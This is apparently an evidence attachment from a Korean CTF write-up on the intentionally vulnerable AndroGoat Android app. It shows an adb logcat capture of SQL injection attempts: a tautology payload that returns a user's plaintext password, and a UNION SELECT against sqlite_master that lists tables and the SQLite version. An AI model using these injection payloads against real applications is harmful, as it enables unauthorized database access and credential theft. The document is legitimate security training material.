---
{"title":"09_sqli_logcat.txt","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"04_input_validations/09_sqli_logcat.txt · 콘솔·로그 기록 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `04_input_validations/09_sqli_logcat.txt` · 콘솔·로그 기록.

<pre><code>﻿PS&gt; adb logcat -d -s Query:V QueryResult:E
11-12 03:58:02.564  9732  9732 E QueryResult: User: (nobody) not found
11-12 03:58:02.592  9732  9732 V Query   : SELECT * FROM users WHERE username=&#x27;nobody&#x27;
11-12 03:58:13.307  9732  9732 E QueryResult: Username: (bob) password: (B0b_P4ssw0rd)
11-12 03:58:13.375  9732  9732 V Query   : SELECT * FROM users WHERE username=&#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;
11-12 03:58:26.494  9732  9732 E QueryResult: Username: (3.32.2) password: (android_metadata,users,sqlite_sequence)
11-12 03:58:26.510  9732  9732 V Query   : SELECT * FROM users WHERE username=&#x27;x&#x27; UNION SELECT 1,sqlite_version(),group_concat(name) FROM sqlite_master--&#x27;
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
